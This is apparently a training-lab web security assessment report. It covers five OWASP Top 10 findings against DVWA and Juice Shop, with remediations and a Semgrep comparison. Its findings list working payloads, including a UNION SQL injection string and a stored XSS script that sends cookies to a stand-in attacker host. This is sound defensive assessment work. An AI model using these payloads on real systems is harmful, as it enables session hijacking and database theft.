# Workstream B Report — Web Application Security Assessment

**Project KAVACH · Workstream B · Web Application Security Assessment**

---

## 1. Test Environment Setup
The assessment environment was simulated utilizing Docker container profiles representing two distinct web surfaces, mirroring the architecture of the Meridian FinServe portals:
1. **Damn Vulnerable Web Application (DVWA)**: Stands in for legacy PHP-based intranet banking portals and administrative dashboard platforms.
2. **OWASP Juice Shop**: Stands in for modern, JavaScript-heavy, API-driven customer and partner portals.

*The environment can be spun up in less than 15 minutes by executing `docker-compose up -d` within the `webapp/env/` directory.*

---

## 2. Findings Summary & OWASP Mapping

Five vulnerabilities spanning the OWASP Top 10 (2021) categories were identified, exploited, and remediated:

| Finding ID | Vulnerability Name | OWASP Category | Target Application | Remediation Type |
|---|---|---|---|---|
| **F-01** | SQL Injection (SQLi) | [A03:2021-Injection](findings/F-01-sqli/finding.md) | DVWA | Code Patch (PDO Prepared Statement) |
| **F-02** | Stored Cross-Site Scripting (XSS) | [A03:2021-Injection](findings/F-02-xss-stored/finding.md) | DVWA | Code Patch (Output htmlspecialchars) |
| **F-03** | Insecure Direct Object Reference (IDOR) | [A01:2021-Broken Access Control](findings/F-03-idor/finding.md) | Juice Shop | Code Patch (Session JWT Owner check) |
| **F-04** | Weak Auth & Missing Lockout | [A07:2021-Identification & Auth Failures](findings/F-04-auth-weakness/finding.md) | DVWA | Config Patch (Nginx Rate Limiting) |
| **F-05** | Exposed Static Backup Directory | [A05:2021-Security Misconfiguration](findings/F-05-security-misconfig/finding.md) | Juice Shop | Config Patch (Express path block) |

---

## 3. Detailed Vulnerability Summaries

### F-01: SQL Injection
- **Payload**: `1' UNION SELECT user, password FROM users -- `
- **Impact**: Dump database contents, exposing administrative usernames and password hashes.
- **Remediation**: Replaced string concatenation with PDO prepared statements and bound variables.

### F-02: Stored Cross-Site Scripting
- **Payload**: `<script>fetch('http://attacker.com/log?c='+document.cookie)</script>`
- **Impact**: Hijack user sessions, steal cookies, and perform actions in the context of authenticated sessions.
- **Remediation**: Encapsulated output display variables in `htmlspecialchars()` functions to sanitize HTML rendering.

### F-03: Insecure Direct Object Reference (IDOR)
- **Payload**: Manipulating URL resource identifier (`/api/Addresss/1` instead of `/api/Addresss/2`)
- **Impact**: Leakage of physical address books and private contact numbers for all users.
- **Remediation**: Added backend authentication checks validating that the requested resource ID belongs to the requesting JWT user session.

### F-04: Weak Authentication / No Lockout
- **Payload**: Automated password brute-forcing (via Hydra).
- **Impact**: Administrative account takeover via automated credential guessing.
- **Remediation**: Configured limit request rules (`limit_req`) on the Nginx front-end reverse proxy.

### F-05: Security Misconfiguration
- **Payload**: Direct directory browsing at `/ftp/` and download bypass via parameter naming manipulation.
- **Impact**: Leakage of developer backup files containing dependencies and API keys.
- **Remediation**: Configured routes in the web server router to disable file index listing and restrict extension downloads.

---

## 4. SAST Analysis Baseline Comparison

Static Application Security Testing (SAST) was simulated utilizing Semgrep rulesets pre and post-remediation. The summary results are documented below:

### Before Patches ([sast/before.json](sast/before.json))
- **Total Findings**: 5
- **Severities**: 3 ERROR, 2 WARNING
- **Critical Paths**: SQLi in `low.php`, XSS in `index.php`, IDOR in `address.js`.

### After Patches ([sast/after.json](sast/after.json))
- **Total Findings**: 0
- **Verification**: All 5 SAST findings were successfully cleared. The code-level patches completely resolved input-handling and authorization anomalies.
